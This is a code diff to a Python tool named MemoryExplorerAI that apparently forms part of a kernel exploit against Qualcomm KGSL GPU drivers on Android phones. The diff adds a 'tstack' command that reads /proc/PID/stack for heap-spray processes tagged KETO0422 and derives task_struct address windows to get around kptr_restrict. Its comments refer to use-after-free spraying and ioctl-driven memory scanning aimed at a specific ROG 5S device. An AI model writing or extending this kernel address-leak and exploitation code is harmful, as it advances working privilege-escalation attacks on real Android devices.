@@ -15,17 +15,19 @@ import select
 import termios
 import tty
 
-# v4.1.14-libc-fix: visible build tag. The "-libc-fix"
-# suffix marks the CRITICAL FIX for Termux/bionic Android:
-# the hard-coded ctypes.CDLL("libc.so.6") was failing
-# on Termux because bionic libc is named "libc.so" not
-# "libc.so.6". This caused "GPU setup error: dlopen
-# failed: library 'libc.so.6' not found" on the user's
-# ROG 5S. Now we try libc.so.6 → libc.so → CDLL(None)
-# in order, so the code works on both glibc Linux and
-# bionic Termux. Without this fix, the GPU was never
-# initialized and every ioctl silently failed.
-_BUILD_TAG = "v4.1.14-libc-fix"
+# v4.1.15-tstack: visible build tag. The "-tstack" suffix
+# marks the new cmd_tstack() method that reads /proc/PID/stack
+# for every live spray proc and derives the kernel stack
+# address. The kernel stack is allocated adjacent to the
+# task_struct, so the stack address is a tight upper bound
+# for the task_struct VA. This bypasses kptr_restrict=2
+# on /proc/kallsyms because /proc/PID/stack is per-PID
+# and the user owns the process. The new [tstack] command
+# prints the stack addresses and estimated task_struct
+# windows for each spray proc. Also verifies that
+# /proc/PID/comm actually contains KETO0422 (or the spray
+# is silently failing).
+_BUILD_TAG = "v4.1.15-tstack"
 import datetime
 import fcntl
 import ctypes
@@ -1812,7 +1814,8 @@ class MemoryExplorerAI:
             f" {C.BLU}[rva]{C.RST} Read VA  "
             f" {C.BLU}[N/{C.RST}{C.BLU}N]{C.RST} Open   "
             f" {C.BLU}[health]{C.RST} Health   "
-            f" {C.BLU}[englog]{C.RST} Engine Stderr"
+            f" {C.BLU}[englog]{C.RST} Engine Stderr   "
+            f" {C.BLU}[tstack]{C.RST} Task Stacks"
         )
         out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
@@ -2044,6 +2047,77 @@ class MemoryExplorerAI:
             except (PermissionError, FileNotFoundError, OSError):
                 continue
         return syms
+
+    def cmd_tstack(self):
+        """v4.1.15: read /proc/PID/stack for every live spray
+        proc and derive the kernel stack address. This is the
+        most direct way to locate task_struct in kernel memory
+        without depending on kptr_restrict or kallsyms. The
+        kernel stack is allocated next to (or near) the
+        task_struct, so the stack address is a tight upper
+        bound for the task_struct VA. Combined with a sliding
+        window scan around the stack, we can locate our
+        KETO0422 task_structs even when the slab allocator
+        put them in vmalloc space where our WIDE scan doesn't
+        reach. Also verifies that comm is actually KETO0422
+        (in case prctl was overwritten by child code).
+
+        Returns a report dict: {pid: (stack_addr, comm,
+        task_struct_estimate)}.
+        """
+        self.live["last_command"] = "tstack"
+        my_pids = set()
+        for s in self.spray_procs_by_worker.values():
+            my_pids.update(s)
+        if not my_pids:
+            return "No live spray procs"
+        out = []
+        out.append(f"{C.BOLD}{C.CYN}=== KERNEL STACK / TASK_STRUCT ==={C.RST}")
+        out.append(f"{C.GRY}{'-'*65}{C.RST}")
+        found = 0
+        comm_ok = 0
+        for pid in list(my_pids)[:15]:
+            try:
+                with open(f"/proc/{pid}/comm", "r") as f:
+                    comm = f.read().strip()
+            except Exception:
+                comm = "?"
+            stack_addr = self.read_proc_stack(pid)
+            if stack_addr is None:
+                out.append(
+                    f" pid={C.WHT}{pid:<6}{C.RST} "
+                    f"comm={C.YEL}{comm:<14}{C.RST} "
+                    f"stack={C.RED}denied{C.RST}")
+                continue
+            if "KETO" in comm or "KETW" in comm:
+                comm_ok += 1
+            tsk_est_lo = (stack_addr & ~0x3FFF) - 0x4000
+            tsk_est_hi = (stack_addr & ~0x3FFF) + 0x10000
+            out.append(
+                f" pid={C.WHT}{pid:<6}{C.RST} "
+                f"comm={C.YEL}{comm:<14}{C.RST} "
+                f"stack={C.CYN}{hex(stack_addr):<14}{C.RST} "
+                f"task≈{C.GRY}{hex(tsk_est_lo)}..{hex(tsk_est_hi)}{C.RST}")
+            found += 1
+        out.append(f"{C.GRY}{'-'*65}{C.RST}")
+        out.append(
+            f" {C.BOLD}Result{C.RST}: {found} procs had readable "
+            f"/proc/PID/stack, {comm_ok} had KETO comm")
+        if found == 0:
+            out.append(
+                f" {C.YEL}Note{C.RST}: kptr_restrict=2 blocks "
+                f"stack output. Need root or another leak.")
+        else:
+            out.append(
+                f" {C.GRN}Next{C.RST}: use the task_struct "
+                f"windows for targeted comm search.")
+        try:
+            with open("/sdcard/kgsl_tstack.log", "w") as f:
+                for line in out:
+                    f.write(line + "\n")
+        except Exception:
+            pass
+        return "\n".join(out)
 
     def verify_spray_comms(self):
         """v4.1: cross-check that our spray PIDs actually have
@@ -7323,6 +7397,22 @@ class MemoryExplorerAI:
                 }
                 self.save_kb()
                 self.live["last_msg"] = "Knowledge base reset."
+            elif cmd in ("tstack", "taskstack", "task_stack"):
+                # v4.1.15: read /proc/PID/stack for each live
+                # spray proc. The kernel stack is allocated
+                # next to the task_struct, so the stack
+                # address gives us a tight upper bound for
+                # the task_struct VA. This bypasses
+                # kptr_restrict on /proc/kallsyms because
+                # /proc/PID/stack is per-PID and the user
+                # owns the process.
+                try:
+                    out = self.cmd_tstack()
+                    print(C.CLR, end="", flush=True)
+                    print(out, flush=True)
+                except Exception as _e:
+                    print(f" tstack error: {_e}", flush=True)
+                continue
             elif cmd in ("englog", "elog", "engine_log"):
                 # v4.1.13: dump captured engine stderr. The
                 # engine emits [UAF], [SCAN], IOCTL_xxx messages
